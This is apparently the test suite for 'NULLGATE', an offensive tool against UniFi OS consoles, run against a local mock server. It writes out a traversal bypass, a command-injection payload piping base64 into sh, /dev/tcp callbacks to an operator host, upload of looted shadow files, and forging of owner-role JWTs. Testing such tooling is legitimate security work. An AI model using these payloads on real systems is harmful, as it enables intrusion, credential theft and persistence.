"""Hardware-free tests for NULLGATE.

A local mock HTTPS-less console emulates the vulnerable nginx/backend so the
whole chain -- verbatim URI, safe probe, injection, callback confirmation,
loot POST -- is exercised without a target, a Pager or a radio.
"""

import base64
import io
import json
import os
import re
import sys
import tarfile
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit
from urllib.request import Request, urlopen

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from sd import attack, collector, discovery, net  # noqa: E402
from sd.engine import Engine  # noqa: E402
from sd.ui import FakePager, NullgateUI, sample_state, send_cmd  # noqa: E402


# --- mock vulnerable console -------------------------------------------------

class MockConsole:
    """Emulates the CVE-2026-34908/34910 behavior on plain HTTP.

    patched=True returns 400 to the bypass (5.0.8 behavior).
    fingerprint=False serves no UniFi OS markers (not a console).
    """

    def __init__(self, patched=False, fingerprint=True, cb_port=None):
        self.patched = patched
        self.fingerprint = fingerprint
        self.cb_port = cb_port
        self.requests = []
        self.commands = []
        self.server = None
        self.thread = None
        outer = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.0"

            def log_message(self, *args):
                pass

            def _send(self, status, body, ctype="application/json"):
                data = body.encode("utf-8", "replace")
                self.send_response(status)
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Content-Type", ctype)
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                raw = self.path
                outer.requests.append(raw)
                if raw == "/":
                    body = ("<html><title>UniFi OS</title>"
                            "window.UNIFI_OS_MANIFEST</html>") if outer.fingerprint else "<html>other</html>"
                    return self._send(200, body, "text/html")
                if raw == net.BASELINE_UPDATE:
                    return self._send(401, "unauthorized")
                if raw.startswith(net.TRAVERSAL):
                    if not outer.fingerprint:
                        return self._send(401, "unauthorized")
                    if outer.patched:
                        return self._send(400, "bad request")
                    if "app-assets/users/" in raw:
                        return self._send(200, "root:x:0:0:root:/root:/bin/bash\n", "text/plain")
                    q = parse_qs(urlsplit(raw).query)
                    if "pkg_name" not in q:
                        return self._send(200, '{"code":-3,"codeS":"CODE_SYSTEM_ERROR",'
                                               '"msg":"query param pkg_name required"}')
                    pkg = q["pkg_name"][0]
                    outer.commands.append(pkg)
                    outer._execute(pkg)
                    return self._send(200, '{"code":-3,"codeS":"CODE_SYSTEM_ERROR"}')
                return self._send(404, "nope")

            def do_POST(self):
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(length)
                outer.requests.append("POST " + self.path)
                outer.last_post = body.decode("utf-8", "replace")
                self._send(200, "ok")

        self.Handler = Handler

    @staticmethod
    def _make_loot_b64():
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            data = b"root:x:0:0:root:/root:/bin/bash\n"
            info = tarfile.TarInfo("shadow")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
        return base64.b64encode(buf.getvalue()).decode("ascii")

    def _execute(self, pkg, cb_port=None):
        """Simulate the target running our injected script: call back with nonce."""
        port = self.cb_port or cb_port or 8844
        if not pkg.startswith("evil;echo ") or "|base64 -d|sh" not in pkg:
            return
        b64 = pkg[len("evil;echo "):].split("|", 1)[0]
        try:
            script = base64.b64decode(b64).decode("utf-8", "replace")
        except Exception:
            return
        m = re.search(r"n=([0-9a-f]+)", script)
        if not m:
            return
        nonce = m.group(1)
        if "nullgate_out" in script and "send_post" in script:
            marker = "data"
        elif "persist" in script.lower() or "Bearer" in script:
            marker = "persist"
        else:
            marker = "proof"
        try:
            if marker == "data":
                body = self._make_loot_b64().encode()
                req = Request("http://127.0.0.1:%d/cb?n=%s&k=data" % (port, nonce),
                              data=body, method="POST")
            else:
                req = Request("http://127.0.0.1:%d/cb?n=%s&m=%s" %
                              (port, nonce, marker))
            urlopen(req, timeout=3).read()
        except Exception:
            pass

    def start(self):
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), self.Handler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever,
                                       daemon=True)
        self.thread.start()
        return self

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        self.server = None


# --- tests -------------------------------------------------------------------

class TransportTests(unittest.TestCase):
    def test_verbatim_uri_keeps_encoded_traversal(self):
        path = net.bypass_path(params={"pkg_name": "evil;id", "by_cmd": "true"})
        self.assertTrue(path.startswith(net.TRAVERSAL))
        self.assertIn("..%2f..%2f..%2f", path)
        self.assertNotIn("/../", path)
        self.assertIn("pkg_name=evil%3Bid", path)

    def test_file_read_path(self):
        p = net.file_read_path("/etc/passwd")
        self.assertIn("app-assets/users/", p)
        self.assertEqual(p.count("..%2f"), 9)  # 3 in traversal + 6 alias hops
        self.assertTrue(p.endswith("etc/passwd"))

    def test_capcheck_entrypoint(self):
        import subprocess
        out = subprocess.check_output(
            [sys.executable, os.path.join(ROOT, "nullgate.py"), "capcheck"],
            text=True)
        self.assertIn("capcheck: PASS", out)


class MockConsoleTests(unittest.TestCase):
    def make(self, **kw):
        mock = MockConsole(**kw).start()
        self.addCleanup(mock.stop)
        return mock

    def test_safe_probe_vulnerable(self):
        mock = self.make()
        r = net.safe_probe("127.0.0.1", mock.port, tls=False)
        self.assertEqual(r["state"], "vulnerable")
        self.assertTrue(any("..%2f" in p for p in mock.requests))

    def test_safe_probe_patched(self):
        mock = self.make(patched=True)
        r = net.safe_probe("127.0.0.1", mock.port, tls=False)
        self.assertEqual(r["state"], "patched")

    def test_safe_probe_unaffected(self):
        mock = self.make(fingerprint=False)
        r = net.safe_probe("127.0.0.1", mock.port, tls=False)
        self.assertEqual(r["state"], "unaffected")

    def test_injection_sends_decodable_script(self):
        mock = self.make()
        net.send_injection("127.0.0.1", mock.port,
                           attack.proof_script("abc123", "127.0.0.1", 8844),
                           tls=False)
        self.assertTrue(mock.commands)
        payload = mock.commands[0]
        self.assertTrue(payload.startswith("evil;echo "))
        b64 = payload[len("evil;echo "):].split("|", 1)[0]
        script = base64.b64decode(b64).decode()
        self.assertIn("abc123", script)
        self.assertIn("send_get", script)

    def test_file_read(self):
        mock = self.make()
        ok, text = net.read_file("127.0.0.1", mock.port, "/etc/passwd",
                                 tls=False)
        self.assertTrue(ok)
        self.assertIn("root:x:0:0", text)


class AttackTests(unittest.TestCase):
    def test_b64_roundtrip(self):
        self.assertEqual(attack.b64decode(attack.b64("hello")), "hello")

    def test_jwt_forge_uses_hmac(self):
        t = attack.forge_token("secret", claims={"role": "owner"})
        self.assertEqual(t.count("."), 2)
        hdr, payload = attack.jwt_decode(t)
        self.assertEqual(hdr["alg"], "HS256")
        self.assertEqual(payload["role"], "owner")

    def test_read_jwt_secret(self):
        self.assertEqual(attack.read_jwt_secret("x: 1\nsecret: abc123\n"),
                         "abc123")

    def test_proof_script_has_nonce(self):
        s = attack.proof_script("deadbeef", "10.0.0.5", 8844)
        self.assertIn("n=deadbeef", s)
        self.assertIn("/dev/tcp/10.0.0.5/8844", s)

    def test_persist_only_callbacks_on_accepted_token(self):
        s = attack.persist_probe_script("abc", "10.0.0.5", 8844, "jwt.token.here")
        self.assertIn("curl -fsS", s)  # -f => non-2xx does not confirm
        self.assertIn("Bearer jwt.token.here", s)


class CollectorTests(unittest.TestCase):
    def make(self, loot):
        col = collector.Collector(port=0, loot=loot)
        # port=0 lets the OS pick; use the real assigned port.
        self.assertTrue(col.start(), col.error)
        self.addCleanup(col.stop)
        col.port = col.server.server_address[1]
        return col

    def test_get_callback_seen(self):
        with tempfile.TemporaryDirectory() as d:
            col = self.make(d)
            urlopen("http://127.0.0.1:%d/cb?n=abcd&m=proof" % col.port,
                    timeout=3).read()
            self.assertTrue(col.seen("abcd", "proof"))
            self.assertFalse(col.seen("zzzz"))

    def test_post_loot_saved(self):
        with tempfile.TemporaryDirectory() as d:
            col = self.make(d)
            body = MockConsole._make_loot_b64().encode()
            req = Request("http://127.0.0.1:%d/cb?n=abc123&k=data" % col.port,
                          data=body, method="POST")
            urlopen(req, timeout=3).read()
            self.assertTrue(col.seen("abc123"))
            self.assertTrue(col.take_loot("abc123"))
            self.assertTrue(os.path.isdir(os.path.join(d, "dump_abc123")))


class EngineTests(unittest.TestCase):
    def make_engine(self, sim=True, **kw):
        d = tempfile.mkdtemp()
        return Engine(os.path.join(d, "state.json"),
                      os.path.join(d, "cmd.jsonl"),
                      os.path.join(d, "loot"), sim=sim, **kw)

    def test_authorization_gate(self):
        e = self.make_engine()
        e.handle({"cmd": "discover"})
        self.assertEqual(e.state["error"], "authorization required first")
        self.assertEqual(e.state["targets"], [])

    def test_sim_full_flow(self):
        e = self.make_engine()
        e.handle({"cmd": "authorize"})
        e.handle({"cmd": "discover"})
        self.assertGreater(len(e.state["targets"]), 0)
        e.handle({"cmd": "select", "index": 0})
        e.handle({"cmd": "probe"})
        self.assertEqual(e.state["probe"]["state"], "vulnerable")
        e.handle({"cmd": "exploit", "stage": "proof"})
        self.assertEqual(e.state["exploit"]["proof"], "confirmed")
        e.handle({"cmd": "read", "path": "/etc/passwd"})
        self.assertTrue(e.state["read_result"]["ok"])

    def test_end_to_end_real_callback(self):
        """Full non-sim chain against the mock, confirmed by real callback."""
        with tempfile.TemporaryDirectory() as d:
            e = Engine(os.path.join(d, "state.json"),
                       os.path.join(d, "cmd.jsonl"),
                       os.path.join(d, "loot"), sim=False,
                       cb_host="127.0.0.1", cb_port=0, tls=False)
            e.handle({"cmd": "authorize"})
            self.assertIsNotNone(e.collector)
            self.addCleanup(e.collector.stop)
            cb_port = e.collector.server.server_address[1]

            mock = MockConsole(cb_port=cb_port).start()
            self.addCleanup(mock.stop)

            e.state["targets"] = [{"host": "127.0.0.1", "port": mock.port,
                                   "state": "vulnerable", "selectable": True}]
            e.handle({"cmd": "select", "index": 0})
            e.handle({"cmd": "probe"})
            self.assertEqual(e.state["probe"]["state"], "vulnerable")

            e.handle({"cmd": "exploit", "stage": "proof"})
            self.assertEqual(e.state["exploit"]["proof"], "confirmed",
                             "proof must be confirmed by callback")

            e.handle({"cmd": "exploit", "stage": "loot"})
            self.assertEqual(e.state["exploit"]["loot"], "confirmed",
                             "loot must be confirmed by callback")
            self.assertTrue(os.path.isdir(
                os.path.join(d, "loot",
                             "dump_%s" % e.state["nonce"][:12])))

    def test_forge_from_looted_jwt(self):
        with tempfile.TemporaryDirectory() as d:
            loot = os.path.join(d, "loot")
            os.makedirs(os.path.join(loot, "dump_abc", "config"))
            with open(os.path.join(loot, "dump_abc", "config", "jwt.yaml"),
                      "w") as fh:
                fh.write("secret: deadbeef\n")
            e = Engine(os.path.join(d, "state.json"),
                       os.path.join(d, "cmd.jsonl"), loot, sim=True)
            e.handle({"cmd": "forge"})
            self.assertEqual(e.state["token"].count("."), 2)
            _, payload = attack.jwt_decode(e.state["token"])
            self.assertEqual(payload["role"], "owner")

    def test_selftest_entrypoint(self):
        import subprocess
        out = subprocess.check_output(
            [sys.executable, os.path.join(ROOT, "nullgate.py"), "selftest"],
            text=True, env=dict(os.environ, NULLGATE_SIM="1"))
        self.assertIn("targets=3", out)
        self.assertIn("proof=confirmed", out)


class UITests(unittest.TestCase):
    @staticmethod
    def click(ui, btn):
        ui.last_sent = 0.0
        ui.button(btn)

    def test_render_all_screens(self):
        p = FakePager()
        with p:
            ui = NullgateUI(p)
            ui.state = sample_state()
            for i in range(5):
                ui.screen_idx = i
                ui.render()
        self.assertGreater(p.frames, 0)

    def test_authorize_button(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["NULLGATE_CMD"] = os.path.join(d, "cmd.jsonl")
            p = FakePager()
            ui = NullgateUI(p)
            ui.state = {"authorized": False, "phase": "idle"}
            self.click(ui, p.BTN_A)
            with open(os.environ["NULLGATE_CMD"]) as fh:
                self.assertIn("authorize", fh.read())
            os.environ.pop("NULLGATE_CMD", None)

    def test_send_cmd_jsonl(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "cmd.jsonl")
            send_cmd({"cmd": "probe"}, path)
            with open(path) as fh:
                self.assertEqual(json.loads(fh.read().strip()), {"cmd": "probe"})


class LauncherTests(unittest.TestCase):
    def test_payload_header(self):
        with open(os.path.join(ROOT, "payload.sh")) as fh:
            text = fh.read()
        self.assertTrue(text.startswith("#!/bin/bash"))
        self.assertIn("# Title: NULLGATE", text)
        self.assertIn("AUTHORIZED TESTING ONLY", text)
        self.assertIn("11443", text)
        self.assertIn("capcheck", text)


if __name__ == "__main__":
    unittest.main()
